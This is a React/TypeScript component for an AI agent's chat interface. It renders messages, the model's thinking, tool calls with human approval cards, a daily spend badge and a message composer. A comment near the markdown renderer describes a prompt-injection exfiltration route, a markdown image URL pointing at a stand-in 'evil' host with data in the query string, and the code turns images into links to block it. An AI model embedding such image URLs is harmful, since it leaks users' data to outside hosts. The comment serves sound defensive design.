import { useEffect, useRef, useState } from "react";
import Markdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { api, type ConnStatus } from "./api";
import { Badge } from "./App";
import type { PendingApproval, ToolCall } from "./protocol.gen";
import type { ChatState } from "./state";

interface Props {
  sid: string;
  state: ChatState;
  conn: ConnStatus;
  onError: (e: unknown) => void;
  onToggleFiles: () => void;
}

export function Chat({ sid, state, conn, onError, onToggleFiles }: Props) {
  const busy = state.runState !== "idle" && state.runState !== "error";
  const send = (c: Parameters<typeof api.command>[1]) => api.command(sid, c).catch(onError);
  const end = useRef<HTMLDivElement>(null);
  const { inFlight: f } = state;
  const [spend, setSpend] = useState<Awaited<ReturnType<typeof api.usage>>>();
  useEffect(() => { if (!busy) api.usage().then(setSpend).catch(() => {}); }, [busy]);
  useEffect(() => { end.current?.scrollIntoView({ block: "end" }); }, [state.items.length, f.text, f.thinking, state.toolOutputs]);
  const pendingShown = state.items.some((i) => i.kind === "assistant" && i.msg.tool_calls.some((c) => c.id === state.pending?.call_id));

  return (
    <main className="chat">
      <header>
        <strong>{sid}</strong>
        <Badge state={state.runState} />
        <span className={`conn ${conn}`} title="Connection">{conn}</span>
        {spend && <span className="spend" title="Spent today">${spend.today_usd.toFixed(2)} / ${spend.day_limit_usd}{spend.paused && " · paused"}</span>}
        <span className="spacer" />
        <button className="ghost" onClick={onToggleFiles}>Files</button>
      </header>
      <div className="messages">
        {state.items.map((it) =>
          it.kind === "user" ? <div key={it.seq} className="msg user">{it.text}</div>
          : it.kind === "notice" ? <div key={it.seq} className={`notice ${it.level}`}>{it.text}</div>
          : (
            <div key={it.seq} className="msg assistant">
              {it.msg.thinking && <Thinking text={it.msg.thinking} />}
              {it.msg.text && <Md text={it.msg.text} />}
              {it.msg.error && <div className="notice error">{it.msg.error}</div>}
              {it.msg.tool_calls.map((c) => <Tool key={c.id} call={c} state={state} send={send} />)}
            </div>
          ))}
        {(f.text || f.thinking) && (
          <div className="msg assistant streaming">
            {f.thinking && <Thinking text={f.thinking} open />}
            {f.text && <Md text={f.text} />}
          </div>
        )}
        {state.pending && !pendingShown && <Approval p={state.pending} send={send} />}
        <div ref={end} />
      </div>
      <Composer busy={busy} send={send} />
    </main>
  );
}

// Images are never loaded: a prompt-injected model could leak data via ![](https://evil/?d=...). javascript: URLs are
// dropped by react-markdown's default urlTransform.
const mdComponents: Components = {
  img: ({ src, alt }) => <a href={typeof src === "string" ? src : undefined} target="_blank" rel="noopener noreferrer">[image: {alt}] {src}</a>,
  a: ({ href, children }) => <a href={href} target="_blank" rel="noopener noreferrer">{children}</a>,
};
export const Md = ({ text }: { text: string }) => <div className="md"><Markdown remarkPlugins={[remarkGfm]} components={mdComponents}>{text}</Markdown></div>;

function Thinking({ text, open }: { text: string; open?: boolean }) {
  return <details className="thinking" open={open}><summary>Thinking</summary><div>{text}</div></details>;
}

type Send = (c: Parameters<typeof api.command>[1]) => void;

function Tool({ call, state, send }: { call: ToolCall; state: ChatState; send: Send }) {
  const result = state.results[call.id];
  const output = result?.content ?? state.toolOutputs[call.id];
  const decision = state.decisions[call.id];
  const status = result ? (result.is_error ? "error" : "done") : state.pending?.call_id === call.id ? "approval" : "running";
  return (
    <details className={`tool ${status}`} open={status !== "done"}>
      <summary>
        <span className="tool-name">{call.name}</span>
        <code className="tool-args">{summarize(call.arguments)}</code>
        <span className={`dot ${status}`} title={status} />
      </summary>
      <pre className="args">{JSON.stringify(call.arguments, null, 2)}</pre>
      {state.pending?.call_id === call.id && <Approval p={state.pending} send={send} inline />}
      {decision && decision !== "allow" && <p className="small muted">Decision: {decision}</p>}
      {output && <pre className={`output ${result?.is_error ? "err" : ""}`}>{output}</pre>}
    </details>
  );
}

function summarize(args: Record<string, unknown>): string {
  const v = Object.values(args)[0];
  return typeof v === "string" ? v.split("\n")[0] : JSON.stringify(args);
}

function Approval({ p, send, inline }: { p: PendingApproval; send: Send; inline?: boolean }) {
  const answer = (decision: "allow" | "deny" | "always") => send({ type: "approve", call_id: p.call_id, decision });
  return (
    <div className="approval-card" role="alertdialog" aria-label="Approval needed">
      <p><strong>Allow {p.tool}?</strong></p>
      {!inline && <pre className="args">{JSON.stringify(p.args, null, 2)}</pre>}
      <div className="row">
        <button className="primary" autoFocus onClick={() => answer("allow")}>Allow</button>
        <button onClick={() => answer("always")}>Always</button>
        <button className="danger" onClick={() => answer("deny")}>Deny</button>
      </div>
    </div>
  );
}

function Composer({ busy, send }: { busy: boolean; send: Send }) {
  const [text, setText] = useState("");
  const [queue, setQueue] = useState(false);
  const submit = () => {
    const t = text.trim();
    if (!t) return;
    send(!busy ? { type: "prompt", text: t } : queue ? { type: "follow_up", text: t } : { type: "steer", text: t });
    setText("");
  };
  return (
    <div className="composer">
      <textarea
        value={text} rows={3} autoFocus aria-label="Message"
        placeholder={busy ? (queue ? "Queue a follow-up…" : "Steer the running agent…") : "Ask anything…  (Enter to send, Shift+Enter for a new line)"}
        onChange={(e) => setText(e.target.value)}
        onKeyDown={(e) => {
          if (e.key === "Enter" && !e.shiftKey && !e.nativeEvent.isComposing) { e.preventDefault(); submit(); }
          if (e.key === "Escape" && busy) send({ type: "abort" });
        }}
      />
      <div className="row">
        {busy && (
          <label className="small"><input type="checkbox" checked={queue} onChange={(e) => setQueue(e.target.checked)} /> Queue as follow-up</label>
        )}
        <span className="spacer" />
        {busy && <button className="danger" onClick={() => send({ type: "abort" })} title="Esc">Stop</button>}
        <button className="primary" onClick={submit} disabled={!text.trim()}>{busy ? (queue ? "Queue" : "Steer") : "Send"}</button>
      </div>
    </div>
  );
}
